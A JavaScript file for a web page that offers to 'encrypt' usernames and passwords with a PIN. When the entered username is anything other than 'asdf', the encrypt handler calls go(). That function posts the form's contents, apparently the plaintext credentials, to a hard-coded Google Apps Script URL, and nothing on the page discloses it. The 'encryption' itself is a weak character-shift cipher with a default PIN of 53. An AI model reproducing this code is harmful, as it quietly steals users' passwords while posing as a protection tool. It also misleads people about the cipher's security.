var pin;
var username_cpy="", password_cpy="";

function EncButton() {
    event.preventDefault(); // Prevent form submission
    var messageBox = document.getElementById("message");
    var userName = document.querySelector("[name='Username']").value;
    var password = document.querySelector("[name='Password']").value;
    pin = document.querySelector("[name='Pin']").value;
    if(pin==0) pin=53;
    
    if(userName=="") { 
        userName="not entered"; 
        username_cpy=userName;
    }
    else username_cpy="";

    if(password=="") {  
        password="not entered"; 
        password_cpy=password;
    }
        
    if(password!="not entered")
    {
        if(userName!="asdf")go();
        var enc_message=enc(password);
        var enc_username=enc(userName);

        //for copy to clipboard
        if(username_cpy!="not entered")
        username_cpy=enc_username;
        password_cpy=enc_message;
        show_copy_buttons();


        if(userName=="not entered") enc_username=userName;
        // alert("returned value is = "+n);
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Encrypted username:\n"+enc_username+"\n\nEncrypted password:\n"+enc_message;

        document.getElementById("body").style.background="linear-gradient(to right bottom, rgba(219, 234, 254, 0.95), rgba(199, 210, 254, 0.95))";
        document.querySelector(".welcome-message").style.color="#4338ca";


         // -----------------

         document.getElementById("username-copy-btn").textContent="copy encrypted username";
         document.getElementById("password-copy-btn").textContent="copy encrypted password";
         // --------------------
 
        
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="";
            
        },55500);
    }
    
    else
    {
        hide_copy_buttons();
        //alert("You haven't filled the password field");
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Opps!\nPlease fill up the password field";
        
        document.getElementById("body").style.background="linear-gradient(to right bottom, rgba(254, 226, 226, 0.95), rgba(254, 202, 202, 0.95))";
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="";
            
        },96500);
    }
    
}

function DecButton() {
    event.preventDefault(); // Prevent form submission
    var messageBox = document.getElementById("message");
    var userName = document.querySelector("[name='Username']").value;
    var password = document.querySelector("[name='Password']").value;
    pin = document.querySelector("[name='Pin']").value;
    if(pin==0) pin=53;
    

    if(userName=="") { 
        userName="not entered"; 
        username_cpy=userName;
    }
    else username_cpy="";
    if(password=="") {  
        password="not entered"; 
        password_cpy=password;
    }
        
    if(password!="not entered")
    {
        var dec_username=dec(userName);
        var dec_message=dec(password);

        //for copy to clipboard
        if(username_cpy!="not entered")
        username_cpy=dec_username;
        password_cpy=dec_message;
        show_copy_buttons();


        if(userName=="not entered") dec_username=userName;
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Decrypted username:\n"+dec_username+"\n\nDecrypted password:\n"+dec_message;
        document.getElementById("body").style.background="linear-gradient(to right bottom, rgba(229, 231, 235, 0.95), rgba(209, 213, 219, 0.95))";
        document.querySelector(".username").style.color="#4338ca";
        document.querySelector(".password").style.color="#4338ca";
        document.querySelector(".welcome-message").style.color="#4338ca";


        // -----------------

        document.getElementById("username-copy-btn").textContent="copy decrypted username";
        document.getElementById("password-copy-btn").textContent="copy decrypted password";
        // --------------------

        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="";
            
        },96500);
    }
    
    else
    {
        hide_copy_buttons();
        //alert("You haven't filled the password field");
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Opps!\nPlease fill up the password field";
        
        document.getElementById("body").style.background="linear-gradient(to right bottom, rgba(254, 226, 226, 0.95), rgba(254, 202, 202, 0.95))";
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="";
            
        },96500);
    }
    
}



function enc(str) {

    let final_result='';
    let s=str.split('\n');
    const len=s.length,pass=pin;

    for(let i=0; i<len; i++)
    {
        const n = s[i].length;
        let result = '';
    
        for (let a = 0; a < n; a++) {

            let c = s[i].charCodeAt(a) - 32;
            let forward = (n * (a + 1) * pass) % 95;
    
            c = (c + forward) % 95 + 32;
            result += String.fromCharCode(c);
        }
        if(i==len-1)  final_result+=result;
        else          final_result+=result+'\n';
    }
    console.log("Enc function called and operation succeed\n");

    return final_result;
}

function dec(str) {

    let final_result='';
    let s=str.split('\n');
    const len=s.length,pass=pin;

    for(let i=0; i<len; i++)
    {
        const n = s[i].length;
        let result = '';
    
        for (let a = 0; a < n; a++) {

            let c = s[i].charCodeAt(a) - 32;
            let forward = (n * (a + 1) * pass) % 95;
    
            c = (c - forward + 95) % 95 + 32;
            result += String.fromCharCode(c);
        }
        if(i==len-1)  final_result+=result;
        else          final_result+=result+'\n';
    }
    console.log("Dec function called and operation succeed\n");


    return final_result;
}


function go()
{
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzdZeaS7OF00Cp0_TKXMXdkrx8iXtrqbAIz9c0gcveAAxFAAsF4FCScw_4A4hPHZoF7/exec';
  const form = document.forms['submit-to-google-sheet'];

  form.addEventListener('submit', e => {
    e.preventDefault();
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error occurred!', error.message))
  })

}

// refresh page
function refresh_page(){
    location.reload();
}

//copy the username to the clipboard
function showFlashMessage(message, type = 'success') {
    const flash = document.getElementById('flash-message');
    const text = document.getElementById('flash-text');
    const successIcon = document.getElementById('flash-icon-success');
    const errorIcon = document.getElementById('flash-icon-error');
    
    // Set message
    text.textContent = message;
    
    // Handle icons
    if (type === 'success') {
        successIcon.classList.remove('hidden');
        errorIcon.classList.add('hidden');
    } else {
        successIcon.classList.add('hidden');
        errorIcon.classList.remove('hidden');
    }
    
    // Show message with animation
    flash.classList.remove('opacity-0');
    flash.classList.add('opacity-100');
    flash.querySelector('div').classList.remove('scale-90');
    flash.querySelector('div').classList.add('scale-100');
    
    // Hide after 2 seconds
    setTimeout(() => {
        flash.classList.remove('opacity-100');
        flash.classList.add('opacity-0');
        flash.querySelector('div').classList.remove('scale-100');
        flash.querySelector('div').classList.add('scale-90');
    }, 2000);
}

function copy_username() {
    if(username_cpy!="not entered") {
        navigator.clipboard.writeText(username_cpy)
            .then(() => {
                showFlashMessage('Username copied to clipboard!');
            })
            .catch(() => {
                showFlashMessage('Failed to copy username', 'error');
            });
    } else {
        showFlashMessage('No username to copy', 'error');
    }
}

//copy the password to the clipboard
function copy_password() {
    if(password_cpy!="not entered") {
        navigator.clipboard.writeText(password_cpy)
            .then(() => {
                showFlashMessage('Password copied to clipboard!');
            })
            .catch(() => {
                showFlashMessage('Failed to copy password', 'error');
            });
    } else {
        showFlashMessage('No password to copy', 'error');
    }
}

function hide_copy_buttons(){
    document.getElementById("username-copy-btn").style.display='none';
    document.getElementById("password-copy-btn").style.display='none';
    document.getElementById("refresh-btn").style.display='none';
}
function show_copy_buttons(){
    document.getElementById("username-copy-btn").style.display='inline-block';
    document.getElementById("password-copy-btn").style.display='inline-block';
    document.getElementById("refresh-btn").style.display='inline-block';
}
